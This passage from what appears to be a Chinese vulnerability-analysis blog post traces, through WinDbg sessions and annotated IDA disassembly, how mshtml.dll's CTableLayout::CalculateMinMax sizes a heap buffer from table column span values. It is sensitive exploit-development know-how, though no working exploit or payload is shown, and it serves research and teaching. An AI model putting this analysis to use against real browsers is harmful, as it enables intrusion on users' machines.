ebx=00000000 ecx=0016f5d8 edx=774064f4 esi=fffffffe edi=00000000</span><br><span class="line">eip=7745e60e esp=0016f5f4 ebp=0016f620 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!LdrpDoDebuggerBreak+0x2c:</span><br><span class="line">7745e60e cc              int     3</span><br><span class="line">1:014&gt; g</span><br><span class="line">ModLoad: 691c0000 69772000   C:\Windows\System32\mshtml.dll</span><br><span class="line">eax=07237000 ebx=00000000 ecx=00171000 edx=00000000 esi=7ffda000 edi=0467b384</span><br><span class="line">eip=774064f4 esp=0467b29c ebp=0467b2f0 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">ntdll!KiFastSystemCallRet:</span><br><span class="line">774064f4 c3              ret</span><br><span class="line"></span><br><span class="line">1:025&gt; lm m mshtml</span><br><span class="line">start    end        module name</span><br><span class="line">691c0000 69772000   mshtml     (deferred)</span><br></pre></td></tr></table></figure></p><ul><li><p>lm (List Loaded Modules)<br>lm命令显示指定的已加载模块。输出中包含模块状态和路径。</p><ul><li>m Pattern<br>指定模块名必须匹配的模板。Pattern可以包含各种通配符和修饰符。关于语法的更多信息，查看字符串通配符语法。</li></ul></li><li><p>sx 命令显示当前进程的异常列表和所有非异常的事件列表，并且显示调试器遇到每个异常和事件时的行为。</p><ul><li>sxe Break<br>当发生该异常时，在任何错误处理器被激活之前目标立即中断到调试器中。这种处理类型称为第一次处理机会。</li></ul></li><li><p>ld (Load Symbols)<br>ld 命令加载指定模块的符号并刷新所有模块信息。</p></li></ul><p>这样组合起来，就是ld制定mshtml加载，然后sxe强制在加载这个模块后断下。<br>现在我们就可以对这个函数下断了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">1:025&gt; bl</span><br><span class="line"> 0 e 692d018a     0001 (0001)  1:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">1:025&gt; g</span><br><span class="line">(c84.798): Unknown exception - code 80010108 (first chance)</span><br><span class="line">(c84.8e8): Unknown exception - code 80010108 (first chance)</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure></p><ul><li>bp, bu, bm (Set Breakpoint)<br>bp、bu和bm命令设置一个或多个软断点(software breakpoints)。可以组合位置、条件和选项来设置各种不同类型的软断点。</li><li>bl (Breakpoint List)<br>bl 命令列出已存在的断点的信息。</li><li>g 命令开始指定进程或线程的执行。这种执行将会在程序结束、遇到BreakAddress 或者其他造成调试器停止的事件发生时停止。</li></ul><p>我在调试的时候辅助了一下IDA，其实是可以不用的。<br>直接静态分析找到CalculateMinMax<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-085115.png" alt=""><br>另外这里也需要导入符号。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-085211.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-085325.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-10-085236.png" alt=""></p><p>单步继续跟随调试，按p就可以单步执行（ 不进入函数那种），不过其实按回车也可以。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018a esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">692d018a 8bff            mov     edi,edi</span><br><span class="line">1:025&gt; </span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018c esp=0467e4b0 ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x2:</span><br><span class="line">692d018c 55              push    ebp</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018d esp=0467e4ac ebp=0467e6c8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x3:</span><br><span class="line">692d018d 8bec            mov     ebp,esp</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d018f esp=0467e4ac ebp=0467e4ac iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x5:</span><br><span class="line">692d018f 81ec90000000    sub     esp,90h</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0195 esp=0467e41c ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xb:</span><br><span class="line">692d0195 53              push    ebx</span><br><span class="line">1:025&gt; </span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0196 esp=0467e418 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xc:</span><br><span class="line">692d0196 8b5d08          mov     ebx,dword ptr [ebp+8] ss:0023:0467e4b4=0492aea8</span><br></pre></td></tr></table></figure></p><p>注意到<strong>mov     ebx,dword ptr [ebp+8] ss:0023:0467e4b4=0492aea8</strong>，[ebp+8]是参数1(知道栈吧..)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd poi(ebp+8)</span><br><span class="line">0492aea8-&gt;poi(ebp+8)  691c9868 06216f30 071d8fb8 69384918</span><br><span class="line">0492aeb8  00000001 00000000 0108080d ffffffff</span><br><span class="line">0492aec8  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492aed8  0001769c 0000a7f8 00000000 00000000</span><br><span class="line">0492aee8  00000000 00412802 00000000 00000000</span><br><span class="line">0492aef8  00000000 00000001 ffffffff ffffffff</span><br><span class="line">0492af08  ffffffff ffffffff 691c9fd0 00000004</span><br><span class="line">0492af18  00000004 0497eff0 691c9fd0 00000004</span><br></pre></td></tr></table></figure><ul><li>dd    双字值(4字节)<br>默认的显示数量为32个DWORD(128字节)。</li><li>poi()<br>指定地址处的指针大小的数据。指针大小或者是 32 位或者是 64 位。在内核调试模式，大小基于目标计算机上的处理器。在 Intel Itanium 计算机上用户模式调试下，大小或者是 32 位或者是 64 位，依赖于目标应用程序。所以，如果你想得到指针大小的数据最好使用 poi 运算符。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; dd poi(ebp+8)</span><br><span class="line">0492aea8  691c9868 06216f30 071d8fb8 69384918</span><br><span class="line">0492aeb8  00000001 00000000 0108080d ffffffff</span><br><span class="line">0492aec8  00000000 00000000 00000000 ffffffff</span><br><span class="line">0492aed8  0001769c 0000a7f8 00000000 00000000</span><br><span class="line">0492aee8  00000000 00412802 00000000 00000000</span><br><span class="line">0492aef8  00000000 00000001 ffffffff ffffffff</span><br><span class="line">0492af08  ffffffff ffffffff 691c9fd0 00000004</span><br><span class="line">0492af18  00000004 0497eff0 691c9fd0 00000004</span><br><span class="line">1:025&gt; ln 691c9868 </span><br><span class="line">(691c9868)   mshtml!CTableLayout::`vftable&apos;   |  (691c99a8)   mshtml!CTableLayoutBlock::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure><ul><li>ln 命令显示给定地址处的或者最近的符号。</li></ul><p>可见参数1引用的是CTableLayout对象，也就是<code>&lt;table&gt;</code>标签中的对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d0199 esp=0467e418 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xf:</span><br><span class="line">692d0199 56              push    esi</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0467e70c</span><br><span class="line">eip=692d019a esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x10:</span><br><span class="line">692d019a 8b750c          mov     esi,dword ptr [ebp+0Ch] ss:0023:0467e4b8=0467e740</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=ffffffff ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d019d esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x13:</span><br><span class="line">692d019d 8b4628          mov     eax,dword ptr [esi+28h] ds:0023:0467e768=00000000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d01a0 esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x16:</span><br><span class="line">692d01a0 898574ffffff    mov     dword ptr [ebp-8Ch],eax ss:0023:0467e420=00171000</span><br><span class="line">1:025&gt; p</span><br><span class="line">eax=00000000 ebx=0492aea8 ecx=00412802 edx=ffffffff esi=0467e740 edi=0467e70c</span><br><span class="line">eip=692d01a6 esp=0467e414 ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1c:</span><br><span class="line">692d01a6 8b4354          mov     eax,dword ptr [ebx+54h] ds:0023:0492aefc=00000001</span><br></pre></td></tr></table></figure></p><p>这里的ebx+54h指向的是table标签里的col元素的span值，在poc中只有一个span值1，所以这里赋值1.</p><p>讲道理，用windbg这样看汇编太难受了，接下来我们用IDA看吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">74</span>D3018A</span><br><span class="line">.text:<span class="number">74</span>D3018A                 mov     edi, edi</span><br><span class="line">.text:<span class="number">74</span>D3018C                 push    ebp</span><br><span class="line">.text:<span class="number">74</span>D3018D                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">74</span>D3018F                 sub     esp, <span class="number">90</span>h</span><br><span class="line">.text:<span class="number">74</span>D30195                 push    ebx             ; <span class="class"><span class="keyword">struct</span> <span class="title">tagSIZE</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">74</span>D30196                 mov     ebx, [ebp+arg_0];-&gt; 参数<span class="number">1</span>引用的是CTableLayout对象，也就是table标签在内存的对象。</span><br><span class="line">.text:<span class="number">74</span>D30199                 push    esi             ; <span class="class"><span class="keyword">struct</span> <span class="title">CTableCalcInfo</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">74</span>D3019A                 mov     esi, [ebp+arg_4]</span><br><span class="line">.text:<span class="number">74</span>D3019D                 mov     eax, [esi+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">74</span>D301A0                 mov     [ebp+var_8C], eax</span><br><span class="line">.text:<span class="number">74</span>D301A6                 mov     eax, [ebx+<span class="number">54</span>h]; -&gt; span属性值的和，我们将其标记为spansum</span><br><span class="line">.text:<span class="number">74</span>D301A9                 mov     [ebp+arg_0], eax; -&gt; arg_0=spansum</span><br><span class="line">.text:<span class="number">74</span>D301AC                 mov     eax, [ebx+<span class="number">128</span>h]</span><br><span class="line">.text:<span class="number">74</span>D301B2                 shr     eax, <span class="number">2</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">.text:<span class="number">74</span>D30293 loc_74D30293:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)+<span class="number">105</span>j</span><br><span class="line">.text:<span class="number">74</span>D30293                 mov     edx, [ebp+arg_0];-&gt; edx=arg_0=spansum</span><br><span class="line">.text:<span class="number">74</span>D30296                 mov     eax, edx</span><br><span class="line">.text:<span class="number">74</span>D30298                 sub     eax, ecx</span><br><span class="line">.text:<span class="number">74</span>D3029A                 mov     [ebp+var_1C], eax</span><br><span class="line">.text:<span class="number">74</span>D3029D                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">74</span>D3029F                 pop     eax</span><br><span class="line">.text:<span class="number">74</span>D302A0                 setz    al</span><br><span class="line">.text:<span class="number">74</span>D302A3                 mov     [ebx+<span class="number">50</span>h], ecx</span><br><span class="line">.text:<span class="number">74</span>D302A6                 shl     eax, <span class="number">8</span></span><br><span class="line">.text:<span class="number">74</span>D302A9                 xor     eax, [ebx+<span class="number">44</span>h]</span><br><span class="line">.text:<span class="number">74</span>D302AC                 <span class="keyword">and</span>     eax, <span class="number">100</span>h</span><br><span class="line">.text:<span class="number">74</span>D302B1                 xor     [ebx+<span class="number">44</span>h], eax</span><br><span class="line">.text:<span class="number">74</span>D302B4                 test    byte ptr [esi+<span class="number">2</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">74</span>D302B8                 jnz     loc_74C5EE4D</span><br><span class="line">.text:<span class="number">74</span>D302BE</span><br><span class="line">.text:<span class="number">74</span>D302BE loc_74D302BE:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)-D133Bj</span><br><span class="line">.text:<span class="number">74</span>D302BE                 xor     eax, eax</span><br><span class="line">.text:<span class="number">74</span>D302C0</span><br><span class="line">.text:<span class="number">74</span>D302C0 loc_74D302C0:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,<span class="keyword">int</span>)+<span class="number">1957B</span>9j</span><br><span class="line">.text:<span class="number">74</span>D302C0                 <span class="keyword">or</span>      [ebp+var_38], eax</span><br><span class="line">.text:<span class="number">74</span>D302C3                 cmp     [ebp+arg_8], edi</span><br><span class="line">.text:<span class="number">74</span>D302C6                 jnz     loc_74EC5948</span><br><span class="line">.text:<span class="number">74</span>D302CC                 mov     eax, [ebx+<span class="number">94</span>h];-&gt;CTableLayout+<span class="number">0x94</span>,用于和spansum作比较，此处标记为spancmp</span><br><span class="line">.text:<span class="number">74</span>D302D2                 shr     eax, <span class="number">2</span>;-&gt; spancmp&gt;&gt;<span class="number">2</span>即spancmp/<span class="number">4</span></span><br><span class="line">.text:<span class="number">74</span>D302D5                 cmp     eax, edx;若spancmp &gt;= spansum,则跳转，这里是<span class="number">0</span>&lt;<span class="number">1</span>，所以不跳转。</span><br><span class="line">.text:<span class="number">74</span>D302D7                 jge     <span class="keyword">short</span> loc_74D30312</span><br><span class="line">.text:<span class="number">74</span>D302D9                 cmp     edx, edi</span><br><span class="line">.text:<span class="number">74</span>D302DB                 lea     esi, [ebx+<span class="number">90</span>h]</span><br><span class="line">.text:<span class="number">74</span>D302E1                 jl      loc_74C2CE82</span><br><span class="line">.text:<span class="number">74</span>D302E7                 cmp     edx, [esi+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">74</span>D302EA                 jbe     <span class="keyword">short</span> loc_74D302FF</span><br><span class="line">.text:<span class="number">74</span>D302EC                 push    <span class="number">1</span>Ch             ; <span class="keyword">unsigned</span> <span class="keyword">int</span></span><br><span class="line">.text:<span class="number">74</span>D302EE                 mov     eax, edx</span><br><span class="line">.text:<span class="number">74</span>D302F0                 mov     edi, esi</span><br><span class="line">.text:<span class="number">74</span>D302F2                 call    ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z ; CImplAry::EnsureSizeWorker(uint,<span class="keyword">long</span>)</span><br></pre></td></tr></table></figure><p>跟进CImplAry::EnsureSizeWorker函数，发现该函数主要用于分配堆内存，分配的内存大小，分配的内存大小为<code>spansum * 0x1C</code>,虽然此处spansum为1，但其分配的最小值为<code>0x1C * 4=0x70</code>，分配的地址保存在CtableLayout+0x9C<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">.text:74DF8F9C ; public: long __thiscall CDataAry&lt;long&gt;::EnsureSize(long)</span><br><span class="line">.text:74DF8F9C ?EnsureSize@?$CDataAry@J@@QAEJJ@Z proc near</span><br><span class="line">.text:74DF8F9C                                         ; CODE XREF: CTimerCtx::CTimerCtx(CTimerMan *,_RTL_CRITICAL_SECTION *)+ACp</span><br><span class="line">.text:74DF8F9C                                         ; CDocument::EnumObjects(ulong,IEnumUnknown * *)+6Bp ...</span><br><span class="line">.text:74DF8F9C</span><br><span class="line">.text:74DF8F9C ; FUNCTION CHUNK AT .text:74DF9013 SIZE 00000009 BYTES</span><br><span class="line">.text:74DF8F9C ; FUNCTION CHUNK AT .text:74EBD728 SIZE 00000007 BYTES</span><br><span class="line">.text:74DF8F9C</span><br><span class="line">.text:74DF8F9C                 mov     edi, edi</span><br><span class="line">.text:74DF8F9E                 push    edi             ; __int32</span><br><span class="line">.text:74DF8F9F                 mov     edi, ecx</span><br><span class="line">.text:74DF8FA1                 test    eax, eax</span><br><span class="line">.text:74DF8FA3                 jl      loc_74EBD728</span><br><span class="line">.text:74DF8FA9                 cmp     eax, [edi+8]</span><br><span class="line">.text:74DF8FAC                 ja      short loc_74DF9013</span><br><span class="line">.text:74DF8FAE                 xor     eax, eax</span><br><span class="line">.text:74DF8FB0                 pop     edi</span><br><span class="line">.text:74DF8FB1                 retn</span><br><span class="line">.text:74DF8FB1 ?EnsureSize@?$CDataAry@J@@QAEJJ@Z endp</span><br><span class="line">.text:74DF8FB1</span><br><span class="line">.text:74DF8FB1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:74DF8FB2                 db 5 dup(90h)</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; Attributes: bp-based frame</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; __int32 __thiscall CImplAry::EnsureSizeWorker(CImplAry *__hidden this, unsigned int, __int32)</span><br><span class="line">.text:74DF8FB7 ?EnsureSizeWorker@CImplAry@@AAEJIJ@Z proc near</span><br><span class="line">.text:74DF8FB7                                         ; CODE XREF: CSelectionRenderingServiceProvider::GetSelectionChunksForLayout(CFlowLayout *,CRenderInfo *,CDataAry&lt;HighlightSegment&gt; *,int *,int *)-6B92p</span><br><span class="line">.text:74DF8FB7                                         ; CView::DeferTransition(COleSite *)+3Fp ...</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 dwBytes         = dword ptr -8</span><br><span class="line">.text:74DF8FB7 var_4           = dword ptr -4</span><br><span class="line">.text:74DF8FB7 Size            = dword ptr  8</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74E02CB4 SIZE 00000036 BYTES</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74E3BEEC SIZE 0000003D BYTES</span><br><span class="line">.text:74DF8FB7 ; FUNCTION CHUNK AT .text:74EBD6E7 SIZE 0000000D BYTES</span><br><span class="line">.text:74DF8FB7</span><br><span class="line">.text:74DF8FB7                 mov     edi, edi</span><br><span class="line">.text:74DF8FB9                 push    ebp</span><br><span class="line">.text:74DF8FBA                 mov     ebp, esp</span><br><span class="line">.text:74DF8FBC                 push    ecx</span><br><span class="line">.text:74DF8FBD                 push    ecx</span><br><span class="line">.text:74DF8FBE                 push    ebx</span><br><span class="line">.text:74DF8FBF                 push    esi             </span><br><span class="line">.text:74DF8FC0                 mov     esi, eax</span><br><span class="line">.text:74DF8FC2                 push    4</span><br><span class="line">.text:74DF8FC4                 pop     eax</span><br><span class="line">.text:74DF8FC5                 mov     [ebp+var_4], eax</span><br><span class="line">.text:74DF8FC8                 cmp     esi, eax</span><br><span class="line">.text:74DF8FCA                 jnb     loc_74E02CB4</span><br><span class="line">.text:74DF8FD0</span><br><span class="line">.text:74DF8FD0 loc_74DF8FD0:                           </span><br><span class="line">.text:74DF8FD0                                         ; CImplAry::EnsureSizeWorker(uint,long)+9D25j ...</span><br><span class="line">.text:74DF8FD0                 mov     eax, [ebp+var_4]; -&gt; eax=4</span><br><span class="line">.text:74DF8FD3                 mul     [ebp+Size]; -&gt;分配spansum*0x1C大小的内存，至少是0x1C*4=0x70</span><br><span class="line">.text:74DF8FD6                 push    edx</span><br><span class="line">.text:74DF8FD7                 push    eax;-&gt; size参数         </span><br><span class="line">.text:74DF8FD8                 lea     eax, [ebp+dwBytes]</span><br><span class="line">.text:74DF8FDB                 call    ?ULongLongToUInt@@YGJ_KPAI@Z ; ULongLongToUInt(unsigned __int64,uint *)</span><br><span class="line">.text:74DF8FE0                 mov     ebx, eax</span><br><span class="line">.text:74DF8FE2                 test    ebx, ebx</span><br><span class="line">.text:74DF8FE4                 jnz     short loc_74DF900B</span><br><span class="line">.text:74DF8FE6                 test    byte ptr [edi+4], 2</span><br><span class="line">.text:74DF8FEA                 jnz     loc_74E3BEEC</span><br><span class="line">.text:74DF8FF0                 push    [ebp+dwBytes] ;-&gt;spansum*0x1c=0x1c </span><br><span class="line">.text:74DF8FF3                 lea     esi, [edi+0Ch]</span><br><span class="line">.text:74DF8FF6                 call    ?_HeapRealloc@@YGJPAPAXI@Z ; -&gt;执行完CimplAry::EnsureSizeWorker函数保存的返回地址在CTableLayout+0x90+0xC，即导致漏洞的堆块，标记为vulheap</span><br><span class="line">.text:74DF8FFB                 mov     ebx, eax</span><br><span class="line">.text:74DF8FFD                 test    ebx, ebx</span><br><span class="line">.text:74DF8FFF                 jnz     short loc_74DF900B</span><br><span class="line">.text:74DF9001</span><br></pre></td></tr></table></figure></p><p>我们看下分配的缓冲区vulheap地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1:025&gt; bp mshtml!CTableLayout::CalculateMinMax+0x168</span><br><span class="line">1:025&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=00000001 ebx=0492aea8 ecx=00000000 edx=00000001 esi=0492af38 edi=0492af38</span><br><span class="line">eip=692d02f2 esp=0467e40c ebp=0467e4ac iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  